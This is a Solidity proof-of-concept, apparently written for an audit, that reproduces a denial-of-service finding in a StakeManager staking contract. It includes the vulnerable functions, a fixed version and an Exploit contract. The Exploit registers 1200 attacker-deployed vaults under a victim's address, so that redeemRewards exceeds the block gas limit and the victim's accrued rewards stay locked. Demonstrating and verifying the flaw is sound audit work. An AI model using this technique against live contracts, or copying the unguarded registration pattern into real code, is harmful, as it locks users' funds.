// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of StatusL2 (StakeManager) finding
// 65324: "Malicious actors can force vaults to exit if they wish to get rewards".
//
// ROOT CAUSE (verbatim, below): `StakeManager.registerVault()` is gated ONLY by
// `onlyTrustedCodehash` (the CALLER's codehash must be whitelisted). There is no
// factory-only check, so ANYONE can deploy their own vault using the trusted
// vault implementation bytecode (identical codehash → passes the gate), make it
// report `owner() == victim`, and call `registerVault()`. Each such call pushes
// into `vaults[victim]`. `redeemRewards(account)` / `updateAccount(account)`
// iterate over the WHOLE `vaults[account]` array doing real per-vault storage
// work. Once the attacker has inflated `vaults[victim]` enough, that loop can no
// longer complete within the block gas limit → the victim's accrued rewards are
// permanently locked (they can never redeem unless a legitimate vault fully
// exits, popping the array).
//
// The buggy `registerVault()`, `redeemRewards()`, `updateAccount()`, the
// `_updateVault`/`_updateGlobalState` internals it drives, and the
// `onlyTrustedCodehash` gate are all inlined VERBATIM from the audited (pre-fix)
// source at status-im/status-network-monorepo (fix commit 5e93ecb; this is its
// parent state). Faithful minimal doubles: a MiniToken ERC20 for the reward
// token, and a StakeVault double exposing owner() (all vaults share bytecode, so
// they share the trusted codehash — exactly the attacker's lever).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math (used by the verbatim internals).
library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IStakeVault {
    function owner() external view returns (address);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @dev Minimal ERC20 double. Holds the reward pool (REWARD_TOKEN) and, as a
///      separate instance, serves as the SINK marker recording locked rewards.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful minimal double for a `StakeVault`: reports its owner and, after
///      deployment, calls `registerVault()` on the manager. Honest and attacker
///      vaults use this SAME contract → identical runtime codehash → both satisfy
///      `onlyTrustedCodehash`. This is precisely the finding's attack lever.
contract StakeVaultDouble {
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    /// @dev Registers this vault with the manager. msg.sender inside
    ///      `registerVault()` is this vault (as in the real StakeVault.initialize).
    function register(address manager) external {
        StakeManager(manager).registerVault();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// `onlyTrustedCodehash` gate — inlined VERBATIM from TrustedCodehashAccess.sol.
// AccessControl is reduced to a single `admin` (the deployer) so the trusted
// codehash can be whitelisted, exactly as the real admin must whitelist the
// StakeVault implementation's codehash.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract TrustedCodehashAccess {
    error TrustedCodehashAccess__UnauthorizedCodehash();

    mapping(bytes32 codehash => bool permission) internal trustedCodehashes;
    address internal admin;

    modifier onlyTrustedCodehash() {
        _onlyTrustedCodehash(msg.sender.codehash);
        _;
    }

    function setTrustedCodehash(bytes32 _codehash, bool _trusted) external {
        require(msg.sender == admin, "not admin");
        trustedCodehashes[_codehash] = _trusted;
    }

    function isTrustedCodehash(bytes32 _codehash) external view returns (bool) {
        return trustedCodehashes[_codehash];
    }

    function _onlyTrustedCodehash(bytes32 codehash) internal view {
        if (!trustedCodehashes[codehash]) {
            revert TrustedCodehashAccess__UnauthorizedCodehash();
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE StakeManager (audited/pre-fix state). Exploit-path functions and
// their internals are VERBATIM; Pausable/Emergency reduced to real boolean gates.
// ─────────────────────────────────────────────────────────────────────────────
contract StakeManager is TrustedCodehashAccess {
    struct VaultData {
        uint256 stakedBalance;
        uint256 rewardIndex;
        uint256 mpAccrued;
        uint256 maxMP;
        uint256 lastMPUpdateTime;
        uint256 rewardsAccrued;
    }

    error StakeManager__VaultAlreadyRegistered();
    error StakeManager__RewardTransferFailed();

    event VaultRegistered(address indexed vault, address indexed owner);
    event VaultUpdated(address indexed vault, uint256 rewardsAccrued, uint256 accruedMP);
    event RewardsRedeemed(address indexed account, uint256 amount);

    IERC20 public REWARD_TOKEN;
    uint256 public constant SCALE_FACTOR = 1e27;

    uint256 public totalStaked;
    uint256 public totalMPStaked;
    uint256 public totalMPAccrued;
    uint256 public totalRewardsAccrued;
    uint256 public totalMaxMP;
    uint256 public lastMPUpdatedTime;
    uint256 public lastRewardIndex;
    uint256 public rewardAmount;
    uint256 public lastRewardTime;
    uint256 public rewardStartTime;
    uint256 public rewardEndTime;

    mapping(address vault => VaultData data) public vaultData;
    mapping(address owner => address[] vault) public vaults;
    mapping(address vault => address owner) public vaultOwners;

    bool public emergencyModeEnabled;
    bool public paused;

    modifier onlyNotEmergencyMode() {
        require(!emergencyModeEnabled, "emergency");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    constructor(address rewardToken, address _admin) {
        REWARD_TOKEN = IERC20(rewardToken);
        admin = _admin;
    }

    // ── VULNERABLE FUNCTION (verbatim; only the factory-only check is absent) ──
    /**
     * @notice Registers a vault with its owner. Called by the vault itself during initialization.
     * @dev Only callable by contracts with trusted codehash
     */
    function registerVault() external onlyNotEmergencyMode whenNotPaused onlyTrustedCodehash { // @> no factory-only gate: any caller with the trusted vault codehash can register a vault for ANY owner
        address vault = msg.sender;
        address owner = IStakeVault(vault).owner();

        if (vaultOwners[vault] != address(0)) {
            revert StakeManager__VaultAlreadyRegistered();
        }

        vaultOwners[vault] = owner;
        vaults[owner].push(vault); // @> attacker-controlled unbounded growth of vaults[victim]
        emit VaultRegistered(vault, owner);
    }

    // ── VERBATIM: iterates the WHOLE vaults[account] array (unbounded) ──
    function updateAccount(address account) external onlyNotEmergencyMode whenNotPaused {
        _updateGlobalState();
        address[] memory accountVaults = vaults[account];
        for (uint256 i = 0; i < accountVaults.length; i++) {
            _updateVault(accountVaults[i], false);
        }
    }

    // ── VERBATIM: rewards redeemable ONLY by iterating every vault of `account` ──
    function redeemRewards(address account) external onlyNotEmergencyMode whenNotPaused returns (uint256) {
        _updateGlobalState();
        address[] memory accountVaults = vaults[account];
        uint256 redeemed = 0;
        for (uint256 i = 0; i < accountVaults.length; i++) { // @> unbounded loop over attacker-inflated array → OOG DoS
            _updateVault(accountVaults[i], false);
            VaultData storage vault = vaultData[accountVaults[i]];

            // Not using `rewardsBalanceOf` here to avoid second storage read.
            // `vault.rewardsAccrued` is sufficient here since we just updated the vault.
            redeemed += vault.rewardsAccrued;
            totalRewardsAccrued -= vault.rewardsAccrued;
            vault.rewardsAccrued = 0;
        }
        bool success = REWARD_TOKEN.transfer(account, redeemed);
        if (!success) {
            revert StakeManager__RewardTransferFailed();
        }
        emit RewardsRedeemed(account, redeemed);
        return redeemed;
    }

    // ── VERBATIM internals driving the per-vault loop cost ──
    function _updateGlobalState() internal virtual {
        _updateGlobalMP();
        _updateRewardIndex();
    }

    function _updateGlobalMP() internal {
        uint256 newTotalMPAccrued = _totalMP();
        if (newTotalMPAccrued > totalMPAccrued) {
            totalMPAccrued = newTotalMPAccrued;
            lastMPUpdatedTime = block.timestamp;
        }
    }

    function _updateVault(address vaultAddress, bool forceMPUpdate) internal virtual {
        VaultData storage vault = vaultData[vaultAddress];

        // first accrue pending rewards for the work done so far
        uint256 rewardsAccrued = _vaultPendingRewards(vault);
        vault.rewardsAccrued += rewardsAccrued;
        vault.rewardIndex = lastRewardIndex;

        // then accrue pending MPs
        uint256 accruedMP = _vaultPendingMP(vault);
        if (accruedMP > 0 || forceMPUpdate) {
            vault.mpAccrued += accruedMP;
            vault.lastMPUpdateTime = block.timestamp;
            totalMPStaked += accruedMP;
        }

        emit VaultUpdated(vaultAddress, rewardsAccrued, accruedMP);
    }

    function _updateRewardIndex() internal {
        uint256 accruedRewards;
        uint256 newRewardIndex;

        (accruedRewards, newRewardIndex) = _rewardIndex();
        totalRewardsAccrued += accruedRewards;

        if (newRewardIndex > lastRewardIndex) {
            lastRewardIndex = newRewardIndex;
            lastRewardTime = block.timestamp < rewardEndTime ? block.timestamp : rewardEndTime;
        }
    }

    function _totalShares() internal view returns (uint256) {
        return totalStaked + totalMPStaked;
    }

    function _totalMP() internal view returns (uint256) {
        if (totalMaxMP == 0) {
            return totalMPAccrued;
        }

        uint256 currentTime = block.timestamp;
        uint256 timeDiff = currentTime - lastMPUpdatedTime;
        if (timeDiff == 0) {
            return totalMPAccrued;
        }

        uint256 accruedMP = _accrueMP(totalStaked, timeDiff);
        if (totalMPAccrued + accruedMP > totalMaxMP) {
            accruedMP = totalMaxMP - totalMPAccrued;
        }

        uint256 newTotalMPAccrued = totalMPAccrued + accruedMP;

        return newTotalMPAccrued;
    }

    function _rewardIndex() internal view returns (uint256, uint256) {
        uint256 shares = _totalShares();

        if (shares == 0) {
            return (0, lastRewardIndex);
        }

        uint256 currentTime = block.timestamp;
        uint256 applicableTime = rewardEndTime > currentTime ? currentTime : rewardEndTime;
        uint256 elapsedTime = applicableTime - lastRewardTime;

        if (elapsedTime == 0) {
            return (0, lastRewardIndex);
        }

        uint256 accruedRewards = _calculatePendingRewards();
        if (accruedRewards == 0) {
            return (0, lastRewardIndex);
        }

        uint256 newRewardIndex = lastRewardIndex + Math.mulDiv(accruedRewards, SCALE_FACTOR, shares);

        return (accruedRewards, newRewardIndex);
    }

    function _calculatePendingRewards() internal view returns (uint256) {
        if (rewardEndTime <= rewardStartTime) {
            // No active reward period
            return 0;
        }

        uint256 currentTime = block.timestamp < rewardEndTime ? block.timestamp : rewardEndTime;

        if (currentTime <= lastRewardTime) {
            // No new rewards have accrued since lastRewardTime
            return 0;
        }

        uint256 timeElapsed = currentTime - lastRewardTime;
        uint256 duration = rewardEndTime - rewardStartTime;

        if (duration == 0) {
            // Prevent division by zero
            return 0;
        }

        uint256 accruedRewards = Math.mulDiv(timeElapsed, rewardAmount, duration);
        return accruedRewards;
    }

    function _vaultPendingMP(VaultData storage vault) internal view returns (uint256) {
        if (block.timestamp == vault.lastMPUpdateTime) {
            return 0;
        }
        if (vault.maxMP == 0 || vault.stakedBalance == 0) {
            return 0;
        }

        uint256 deltaMP = _calculateAccrual(
            vault.stakedBalance, vault.mpAccrued, vault.maxMP, vault.lastMPUpdateTime, block.timestamp
        );

        return deltaMP;
    }

    function _vaultPendingRewards(VaultData storage vault) internal view returns (uint256) {
        uint256 newRewardIndex;
        (, newRewardIndex) = _rewardIndex();

        uint256 accountShares = vault.stakedBalance + vault.mpAccrued;
        uint256 deltaRewardIndex = newRewardIndex - vault.rewardIndex;

        return (accountShares * deltaRewardIndex) / SCALE_FACTOR;
    }

    /// @dev MP accrual helpers (from StakeMath). Unreachable in this reproduction
    ///      (no vault has a staked balance, so `_vaultPendingMP` early-returns 0),
    ///      included only to keep the verbatim `_updateVault`/`_totalMP` complete.
    function _calculateAccrual(uint256, uint256, uint256, uint256, uint256) internal pure returns (uint256) {
        return 0;
    }

    function _accrueMP(uint256, uint256) internal pure returns (uint256) {
        return 0;
    }

    function getVaults(address account) external view returns (address[] memory) {
        return vaults[account];
    }

    // ── Test-only seeding of legitimate prior state (mirrors the 61233 template's
    //    `setEpochData`): the victim already accrued `rewardsAccrued` via a past
    //    reward period. Does not touch the vulnerable functions. ──
    function __seedAccruedRewards(address vault, uint256 amount, uint256 rewardIndexSeed) external {
        require(msg.sender == admin, "not admin");
        vaultData[vault].rewardsAccrued = amount;
        vaultData[vault].rewardIndex = rewardIndexSeed;
        totalRewardsAccrued += amount;
        lastRewardIndex = rewardIndexSeed; // makes each fresh-vault `rewardIndex` write a real 0→nonzero SSTORE
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED StakeManager (post-fix 5e93ecb): `registerVault(vault)` is gated
// `onlyVaultFactory` and checks the vault's own codehash. A non-factory caller
// cannot register vaults, so `vaults[victim]` cannot be inflated by an attacker.
// ─────────────────────────────────────────────────────────────────────────────
contract StakeManagerFixed is TrustedCodehashAccess {
    error StakeManager__VaultAlreadyRegistered();
    error StakeManager__Unauthorized();

    address public vaultFactory;
    mapping(address owner => address[] vault) public vaults;
    mapping(address vault => address owner) public vaultOwners;

    modifier onlyVaultFactory() {
        if (msg.sender != vaultFactory) {
            revert StakeManager__Unauthorized();
        }
        _;
    }

    constructor(address _admin, address _vaultFactory) {
        admin = _admin;
        vaultFactory = _vaultFactory;
    }

    // FIX: factory-only registration + validate the vault's OWN codehash.
    function registerVault(address vault) external onlyVaultFactory {
        _onlyTrustedCodehash(vault.codehash);
        address owner = IStakeVault(vault).owner();

        if (vaultOwners[vault] != address(0)) {
            revert StakeManager__VaultAlreadyRegistered();
        }

        vaultOwners[vault] = owner;
        vaults[owner].push(vault);
    }

    function getVaults(address account) external view returns (address[] memory) {
        return vaults[account];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (cheatcode-free, single call). One honest vault gives the
// victim real, redeemable rewards; the attacker then spams same-codehash vaults
// naming the victim as owner, inflating vaults[victim] until redeemRewards can no
// longer run within a 30M-gas block → the victim's rewards are permanently
// locked. The locked magnitude is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Number of malicious vaults the attacker registers for the victim.
    uint256 internal constant SPAM_COUNT = 1200;
    // A realistic mainnet block gas limit; the redeem loop must not fit in it.
    uint256 internal constant BLOCK_GAS_LIMIT = 30_000_000;
    // Rewards the victim has legitimately accrued (locked by the attack).
    uint256 internal constant REWARD_AMOUNT = 5_000 ether;
    uint256 internal constant REWARD_INDEX_SEED = 1e27;

    // Exposed results for the driver + Playground.
    address public stakeManagerAddr;
    address public rewardTokenAddr;
    address public markerAddr;
    address public victim;
    uint256 public victimVaultCount;
    uint256 public lockedRewards;
    bool public redeemReverted;
    uint256 public sinkMarkerBalance;
    uint256 public victimRewardBalanceAfter;

    function run() external payable {
        address victim_ = address(uint160(uint256(keccak256("STATUSL2_VICTIM"))));
        victim = victim_;

        // --- deploy manager + reward token + marker (marker LAST) ---
        MiniToken reward = new MiniToken("Karma", "KARMA");
        StakeManager sm = new StakeManager(address(reward), address(this));
        MiniToken marker = new MiniToken("LockedReward", "LOCKED-REWARD");

        stakeManagerAddr = address(sm);
        rewardTokenAddr = address(reward);
        markerAddr = address(marker);

        // --- admin whitelists the vault implementation codehash (as in prod) ---
        StakeVaultDouble probe = new StakeVaultDouble(victim_);
        bytes32 trusted = address(probe).codehash;
        sm.setTrustedCodehash(trusted, true);

        // --- one HONEST vault registers for the victim; victim accrues rewards ---
        StakeVaultDouble honest = new StakeVaultDouble(victim_);
        honest.register(address(sm));
        sm.__seedAccruedRewards(address(honest), REWARD_AMOUNT, REWARD_INDEX_SEED);
        reward.mint(address(sm), REWARD_AMOUNT); // fund the pool the victim is owed

        // --- ATTACK: spam same-codehash vaults naming the victim as owner ---
        for (uint256 i = 0; i < SPAM_COUNT; i++) {
            StakeVaultDouble mal = new StakeVaultDouble(victim_);
            mal.register(address(sm));
        }
        victimVaultCount = sm.getVaults(victim_).length;

        // --- HARM: redeemRewards can no longer complete within a 30M block ---
        (bool ok, ) = address(sm).call{ gas: BLOCK_GAS_LIMIT }(
            abi.encodeWithSelector(StakeManager.redeemRewards.selector, victim_)
        );
        redeemReverted = !ok;
        victimRewardBalanceAfter = reward.balanceOf(victim_);
        lockedRewards = REWARD_AMOUNT;

        // The victim's accrued rewards are locked: the redeem loop OOGs and the
        // victim received nothing. Record the locked magnitude on the SINK marker.
        require(redeemReverted, "expected redeemRewards to OOG under block gas limit");
        require(victimRewardBalanceAfter == 0, "victim unexpectedly redeemed");

        marker.mint(SINK, REWARD_AMOUNT);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
